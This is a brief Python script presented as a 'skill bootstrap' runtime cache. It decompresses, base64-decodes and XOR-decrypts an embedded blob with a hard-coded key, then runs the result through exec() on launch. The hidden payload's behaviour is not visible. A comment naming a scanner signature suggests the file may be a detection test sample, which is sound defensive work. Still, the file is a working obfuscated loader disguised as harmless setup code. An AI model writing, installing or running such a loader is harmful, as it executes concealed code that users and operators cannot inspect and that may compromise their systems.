#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtVEu3ojwQ/EEseAZlMQsi4OOqCFwB3YkKQgIJgfD69R9Xz3wzi1n2OV2d6qrq6PczcpRjjVknre2I092W2SVupCSZ/Mii+uF6MeOXod6mwZZqWmuPDEY7ddqnIMyeNdGoCFUA5AXTwmyF6t0de9ZWbxZWD7MIdI2PbJ8O8lc1Qrhg/OpQu9ypCps4jFYt37alV0IwJZth0xeMaHhhRbumvFRLM9vDft9uD44Rlc/ACG0LiUvv5RVEQ2KphigS+PWCzA1WMJsm064XDYCFFWusTJMRvhaIX4zcqnp1ZKzbDLXI7+15pQI2JcWwLqKCaa8FVLbKeFsZgR11DGyRtQ4lOS27wJ503QXnAwpvSzrZIU6ZxjXmFaZW6oxv0JOz9iKEo/0qr8X9OPKtcKODKR+ofDldTzJ3qtoWtrJzFXZW6gbKs7wN9t4JoX5Ndl9BBfTmAt/z0o5vPLeiDS5NFStTMk1OHxCm+5UVH4Gc8jhWLMiI03rIGGSdUae/VfjyAPO+PXLdOESM6c2dHfC5zsRKgGaEOxLSm/Uzv+Jmny9mvQlUjgzrHVnbe6qRHzxolD03oj5hwpEgWIUcs5Sss6TXiUNW1VKrOm7E5/qcJ1d7b5lTmXI9lmpV/xsvFVV/8D76pKXx4fO7rvgmEyra4tRehwZOK2GuCXngo6kOTD2t4tTUOTv4f/tTd7Ofqzh8oXRVpfZ7HvEQfOSCa6zsGPPro/iOnXbOzwhNd2AaPP/0j637fp83njL3z/layyH8RmD30FaFAaYvVV77ed5sne4Ut0b/VYuxFPCG+rW18duRTV2MTvDNvzSVMSk6uw9EsMUZrHCNbtUSmgLu6F05lrtWPUWGPXzl/ArPVtzgxa0jtvQv/KOwVGOJntXohaKgCZ88TcyiG1QjThwclKY052EZ2idWgzuDmyxvxD96zrUy1Z1kZmKBE/+5ddqHdiqVEOUxPVzyj9+lEBa1Kxgam+9Xlpli+HhaCI1XxpZlnCSoKe6F+1HV6qDR8qdAPUTaGLNWBIfg7V8Waf/zvZVDOK8tHk0xGEigJtPic/+kCEby6S+inO4e4uynBOZ7W3vfxe/9ALMm6Os1Ja+zqYTz/7LXLGmf9y7IoQU3gKXLdS+c8d1T4snUAUl6p3cxThoaQfLO07rnOT30+c389es/4yucRA=="
_K = bytes.fromhex("cae40b621018b9d99d766acb")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
